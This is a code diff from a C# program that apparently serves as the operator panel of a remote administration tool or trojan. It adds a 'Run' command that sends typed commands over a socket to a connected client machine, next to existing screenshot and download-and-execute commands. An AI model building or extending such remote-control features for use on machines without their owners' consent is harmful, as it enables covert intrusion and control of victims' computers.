@@ -22,20 +22,28 @@
         {
             this.CmdScreenshot = new CommandHandler(() => this.Screenshot(), this.CanScreenshot());
             this.CmdDownloadExecute = new CommandHandler(() => this.DownloadExecute(), this.CanDownload());
+            this.CmdRun = new CommandHandler(() => this.Run(), this.CanRun());
 
 
             this.CmdDisconnect = new CommandHandler(() => this.Disconnect(), this.CanDisconnect());
             this.clientSocket = clientSocket;
             this.Id = clientSocket.Id;
         }
+ 
+        private bool CanScreenshot()
+        {
+            return true;
+        }
         private bool CanDownload()
         {
             return true;
 
         }
-        private bool CanScreenshot()
+
+        private bool CanRun()
         {
             return true;
+
         }
 
         private void Screenshot()
@@ -52,8 +60,20 @@
             }
         }
 
+        private void Run()
+        {
+            String rcmd = TextInputWindow.ShowWindow("Run Command", "Command:");
+         if (!string.IsNullOrEmpty(rcmd))
+            {
+                this.clientSocket.SendObject(1003, rcmd);
+          
+            
+            }
+        }
+
         public ICommand CmdScreenshot { get; set; }
         public ICommand CmdDownloadExecute { get; set; }
+        public ICommand CmdRun { get; set; }
 
 
 
